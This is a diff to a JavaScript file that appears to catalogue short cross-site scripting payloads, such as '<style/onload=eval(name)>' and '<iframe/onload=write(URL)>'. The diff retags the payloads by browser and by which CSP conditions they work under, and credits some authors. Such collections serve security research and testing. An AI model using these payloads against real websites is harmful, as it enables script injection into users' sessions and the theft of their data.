@@ -1,8 +1,7 @@
 const TAGS = {
-    chrome: 'chromium',
-    firefox: 'firefox',
-    safari: 'safari',
-    firefoxInner: 'firefox-innerHTML',
+    // chrome: 'chromium',
+    // firefox: 'firefox',
+    // safari: 'safari',
     unsafeInline: 'script-unsafe-inline',
     inlineStyleAllow: 'style-inline-allowed',
     inlineStyleBlock: 'style-inline-blocked',
@@ -13,6 +12,9 @@ const TAGS = {
     controlsName: 'controls-name',
     controlsURL: 'controls-URL',
     notInner: 'not-innerHTML',
+    chromeOnly: 'chrome-only',
+    safariOnly: 'safari-only',
+    firefoxInner: 'firefox-innerHTML',
 }
 
 const PAYLOADS = [
@@ -53,7 +55,7 @@ const PAYLOADS = [
     },
     {
         html: "<iframe/onload=write(URL)>",
-        tags: [TAGS.safari, TAGS.unsafeInline, TAGS.controlsURL],
+        tags: [TAGS.safariOnly, TAGS.unsafeInline, TAGS.controlsURL],
         author: '@kinugawamasato'
     },
     {
@@ -73,12 +75,12 @@ const PAYLOADS = [
     },
     {
         html: "<style/onload=eval(name)>",
-        tags: [TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval],
+        tags: [TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval, TAGS.unsafeInline],
         author: null
     },
     {
         html: "<style/onload=write(URL)>",
-        tags: [TAGS.safari, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
+        tags: [TAGS.safariOnly, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
         author: '@kinugawamasato'
     },
     {
@@ -88,7 +90,7 @@ const PAYLOADS = [
     },
     {
         html: "<style/onerror=eval(name)>",
-        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsName, TAGS.inlineStyleBlock],
+        tags: [TAGS.chromeOnly, TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsName, TAGS.inlineStyleBlock],
         author: null
     },
     {
